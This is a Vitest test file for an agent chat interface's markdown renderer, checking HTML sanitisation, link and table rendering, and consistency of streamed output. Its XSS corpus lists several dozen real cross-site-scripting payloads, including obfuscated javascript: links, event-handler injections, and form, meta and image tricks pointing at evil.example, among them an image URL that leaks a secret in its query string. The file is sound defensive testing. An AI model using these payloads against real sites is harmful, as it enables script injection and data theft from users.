import { describe, expect, it } from 'vitest'
import {
  createStreamingRenderer,
  loadHighlighter,
  renderMarkdown,
  renderMarkdownBlocks,
} from '@/lib/agent/markdown/renderer'

const ALLOWED_TAGS = new Set([
  'A', 'BLOCKQUOTE', 'BR', 'BUTTON', 'CODE', 'DEL', 'DIV', 'EM', 'H1', 'H2', 'H3', 'H4', 'H5', 'H6',
  'HR', 'LI', 'OL', 'P', 'PRE', 'S', 'SPAN', 'STRONG', 'TABLE', 'TBODY', 'TD', 'TH', 'THEAD', 'TR', 'UL',
])

function dom(html) {
  const tpl = document.createElement('template')
  tpl.innerHTML = html
  return tpl.content
}

// Structural safety check applied to every corpus output.
function assertSafe(html) {
  const root = dom(html)
  for (const el of root.querySelectorAll('*')) {
    expect(ALLOWED_TAGS.has(el.tagName), `unexpected <${el.tagName}>`).toBe(true)
    for (const attr of el.attributes) {
      expect(attr.name.startsWith('on'), `event handler ${attr.name}`).toBe(false)
      expect(attr.value.replace(/\s/g, '')).not.toMatch(/(javascript|vbscript|data):/i)
      if (attr.name === 'style') expect(attr.value).toMatch(/^text-align:(left|right|center)$/)
      if (attr.name === 'href') expect(attr.value).toMatch(/^(https?:|mailto:)/i)
      if (attr.name === 'src' || attr.name === 'srcset' || attr.name === 'action') {
        throw new Error(`unexpected ${attr.name}`)
      }
    }
  }
  return root
}

const XSS_CORPUS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)><circle r="1"/></svg>',
  '<iframe src="https://evil.example"></iframe>',
  '<a href="javascript:alert(1)">x</a>',
  '<style>body{display:none}</style>',
  '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
  '[x](javascript:alert(1))',
  '[x](JaVaScRiPt:alert(1))',
  '[x](jav&#97;script:alert(1))',
  '[x](&#106;avascript:alert(1))',
  '[x](javascript&colon;alert(1))',
  '[x]( javascript:alert(1))',
  '[x](<javascript:alert(1)>)',
  '[x](vbscript:msgbox(1))',
  '[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
  '[x](file:///etc/passwd)',
  '[x](//evil.example/path)',
  '[x](https://a.example"onmouseover="alert(1))',
  '[x](https://a.example "title\\" onmouseover=\\"alert(1)")',
  '<javascript:alert(1)>',
  'javascript:alert(1)',
  '![t](https://evil.example/p.png?q=secret)',
  '![t](javascript:alert(1))',
  '[![t](https://evil.example/p.png)](https://a.example)',
  '[ref]\n\n[ref]: javascript:alert(1)',
  '```js" onmouseover="alert(1)\nconst a = 1\n```',
  '```<img src=x onerror=alert(1)>\ncode\n```',
  '| a | b |\n|:-:|--:|\n| <b onclick=x>1</b> | [y](javascript:z) |',
  '<div style="background:url(javascript:alert(1))">x</div>',
  '> <script>alert(1)</script>',
  '- [x](javascript:alert(1))\n- <img src=x>',
  '`<script>alert(1)</script>`',
  '&lt;script&gt;alert(1)&lt;/script&gt;',
  '<button data-ag-copy onclick="alert(1)">Copy</button>',
  '<details open ontoggle=alert(1)>',
  '<form action="https://evil.example"><input name=x></form>',
  '<object data="https://evil.example/x.swf"></object>',
  '<base href="https://evil.example/">',
  '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  '[x](tel:+15555550100)',
]

describe('renderMarkdown XSS corpus', () => {
  for (const input of XSS_CORPUS) {
    it(`neutralises ${JSON.stringify(input).slice(0, 60)}`, () => {
      const html = renderMarkdown(input)
      const root = assertSafe(html)
      expect(root.querySelector('script, img, iframe, svg, style, form, input, object, base, meta, math')).toBeNull()
      // Unsafe schemes may survive only as visible, escaped text.
      for (const a of root.querySelectorAll('a')) expect(a.getAttribute('href') || '').toMatch(/^(https?:|mailto:|$)/)
    })
  }

  it('escapes raw HTML as text', () => {
    const root = dom(renderMarkdown('<b>bold</b> <script>x</script>'))
    expect(root.querySelector('b')).toBeNull()
    expect(root.textContent).toContain('<b>bold</b>')
    expect(root.textContent).toContain('<script>x</script>')
  })

  it('keeps the quote-breaking URL inside href', () => {
    const root = dom(renderMarkdown('[x](https://a.example"onmouseover="alert(1))'))
    for (const el of root.querySelectorAll('*')) {
      expect([...el.attributes].some((a) => a.name.startsWith('on'))).toBe(false)
    }
  })

  it('does not fetch images', () => {
    const root = dom(renderMarkdown('![chart](https://evil.example/p.png)'))
    expect(root.querySelector('img')).toBeNull()
  })
})

describe('renderMarkdown output', () => {
  it('opens safe links in a new tab without referrer', () => {
    const root = dom(renderMarkdown('See [docs](https://example.com/a?b=1) and https://cansee.ai/x'))
    const links = root.querySelectorAll('a')
    expect(links).toHaveLength(2)
    for (const a of links) {
      expect(a.getAttribute('target')).toBe('_blank')
      expect(a.getAttribute('rel')).toBe('noopener noreferrer nofollow')
    }
    expect(links[0].getAttribute('href')).toBe('https://example.com/a?b=1')
  })

  it('allows mailto links and leaves other schemes as text', () => {
    const root = dom(renderMarkdown('[mail](mailto:team@example.com) [call](tel:+15555550100)'))
    const links = [...root.querySelectorAll('a')]
    expect(links.map((a) => a.getAttribute('href'))).toEqual(['mailto:team@example.com'])
    expect(root.textContent).toContain('[call](tel:+15555550100)')
  })

  it('does not link bare domains', () => {
    const root = dom(renderMarkdown('config.py and example.com'))
    expect(root.querySelector('a')).toBeNull()
  })

  it('keeps ordered list start numbers', () => {
    const root = dom(renderMarkdown('3. third\n4. fourth'))
    expect(root.querySelector('ol').getAttribute('start')).toBe('3')
  })

  it('wraps tables for horizontal scroll and keeps alignment', () => {
    const root = dom(renderMarkdown('| a | b |\n|:-:|--:|\n| 1 | 2 |'))
    const wrap = root.querySelector('.ag-table')
    expect(wrap).not.toBeNull()
    expect(wrap.querySelector('table')).not.toBeNull()
    expect(root.querySelector('th').getAttribute('style')).toBe('text-align:center')
    expect(root.querySelectorAll('td')[1].getAttribute('style')).toBe('text-align:right')
  })

  it('renders fences with a language label and a Copy button', () => {
    const root = dom(renderMarkdown('```python\nprint("<hi>")\n```'))
    const block = root.querySelector('.ag-code')
    expect(block).not.toBeNull()
    expect(block.querySelector('.ag-code-lang').textContent).toBe('Python')
    const copy = block.querySelector('button[data-ag-copy]')
    expect(copy).not.toBeNull()
    expect(copy.getAttribute('type')).toBe('button')
    expect(block.querySelector('code').textContent).toBe('print("<hi>")\n')
    expect(block.querySelector('code').className).toContain('language-python')
  })

  it('drops unsafe characters from the fence language class', () => {
    const root = dom(renderMarkdown('```js"x\ncode\n```'))
    expect(root.querySelector('code').className).toBe('hljs')
  })

  it('turns single newlines into line breaks', () => {
    const root = dom(renderMarkdown('one\ntwo'))
    expect(root.querySelector('br')).not.toBeNull()
  })

  it('returns an empty string for blank input', () => {
    expect(renderMarkdown('')).toBe('')
    expect(renderMarkdown('   \n')).toBe('')
    expect(renderMarkdown(null)).toBe('')
  })

  it('highlights known languages once the highlighter loads', async () => {
    expect(await loadHighlighter()).toBe(true)
    const root = dom(renderMarkdown('```js\nconst a = 1\n```'))
    expect(root.querySelector('code .hljs-keyword')).not.toBeNull()
    expect(root.querySelector('code').textContent).toBe('const a = 1\n')
  })
})

const DOCS = [
  [
    '# Turonote research',
    '',
    'Turonote ranks **#4** on Google for "best note app" but is not named by ChatGPT.',
    'Second line of the same paragraph.',
    '',
    '| Prompt | Google | ChatGPT |',
    '|:--|--:|:-:|',
    '| best note app | 4 | not named |',
    '| note app for teams | 11 | #3 |',
    '',
    '1. Fix the title tag',
    '2. Add an FAQ',
    '   - with schema',
    '',
    '   continued item',
    '3. Publish',
    '',
    '> Quoted line',
    'lazy continuation',
    '',
    '```json',
    '{"a": [1, 2, 3]}',
    '```',
    '',
    'Setext heading',
    '---',
    '',
    '- a',
    '- b',
    '',
    '---',
    '',
    'Last paragraph with a [link](https://example.com) and `code`.',
  ].join('\n'),
  'Para one\n\n    indented code\n\nPara two\n```\nunclosed fence\nstill code',
  'Intro\n- item one\n- item two\n\n* other list\n\n1) paren list\n2) more\n\nEnd',
]

function joined(blocks) {
  return blocks.map((b) => b.html).join('')
}

describe('createStreamingRenderer', () => {
  for (const [n, doc] of DOCS.entries()) {
    it(`matches a full render at every prefix (doc ${n + 1})`, () => {
      const stream = createStreamingRenderer()
      for (let i = 0; i <= doc.length; i++) {
        const prefix = doc.slice(0, i)
        expect(joined(stream.render(prefix)), `prefix ${i}`).toBe(joined(renderMarkdownBlocks(prefix)))
      }
      expect(joined(stream.render(doc, { final: true }))).toBe(joined(renderMarkdownBlocks(doc)))
      expect(joined(renderMarkdownBlocks(doc))).toBe(renderMarkdown(doc))
    })
  }

  it('keeps finished blocks and only re-renders the last one', () => {
    const stream = createStreamingRenderer()
    const first = stream.render('# Title\n\nFirst paragraph.\n\nSecond')
    expect(first.map((b) => b.key)).toEqual(['b0', 'b1', 'b2'])
    const next = stream.render('# Title\n\nFirst paragraph.\n\nSecond paragraph grows')
    expect(next[0]).toBe(first[0])
    expect(next[1]).toBe(first[1])
    expect(next[2]).not.toBe(first[2])
    expect(next[2].key).toBe('b2')
  })

  it('returns the cached blocks for unchanged text', () => {
    const stream = createStreamingRenderer()
    const a = stream.render('Hello\n\nWorld')
    const b = stream.render('Hello\n\nWorld')
    expect(b[0]).toBe(a[0])
    expect(b[1]).toBe(a[1])
  })

  it('starts over when the text is replaced', () => {
    const stream = createStreamingRenderer()
    stream.render('Old paragraph.\n\nMore old text')
    const blocks = stream.render('New text')
    expect(blocks).toHaveLength(1)
    expect(blocks[0].html).toContain('New text')
  })

  it('treats an unclosed fence as code while streaming', () => {
    const stream = createStreamingRenderer()
    const blocks = stream.render('Before\n\n```js\nconst a = 1')
    const root = dom(joined(blocks))
    expect(root.querySelector('.ag-code code').textContent).toContain('const a = 1')
  })
})
